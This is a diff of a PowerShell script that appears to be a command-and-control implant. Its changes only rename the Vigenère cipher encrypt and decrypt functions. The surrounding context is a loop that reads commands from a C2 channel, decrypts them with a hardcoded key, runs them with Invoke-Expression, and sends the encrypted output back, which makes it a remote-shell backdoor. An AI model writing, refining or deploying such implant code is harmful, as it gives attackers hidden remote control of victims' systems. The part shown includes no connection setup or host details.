@@ -78,7 +78,7 @@ while($true){
 
     $key = "SuPeRSecReTKey";
     # Function to encrypt the plaintext using the Vigenère cipher
-    function Encrypt-VigenereCipher {
+    function Update-EncryptVigenereCipher {
         param (
             [string]$plaintext,
             [string]$key
@@ -109,7 +109,7 @@ while($true){
     }
 
     # Function to decrypt the ciphertext using the Vigenère cipher
-    function Decrypt-VigenereCipher {
+    function Update-DecryptVigenereCipher {
         param (
             [string]$ciphertext,
             [string]$key
@@ -141,12 +141,12 @@ while($true){
 
     # Get commands from the C2, run them and send the output back
     $command = $reader.ReadLine()
-    $command = Decrypt-VigenereCipher -ciphertext $command -key $key
+    $command = Update-DecryptVigenereCipher -ciphertext $command -key $key
     $reply = Invoke-Expression $command
     if($reply.GetType().Name -ne "String"){
         $reply = $reply | Out-String
     }
-    $reply = Encrypt-VigenereCipher -plaintext $reply -key $key
+    $reply = Update-EncryptVigenereCipher -plaintext $reply -key $key
     $writer.WriteLine($reply)
     $I++;
 }
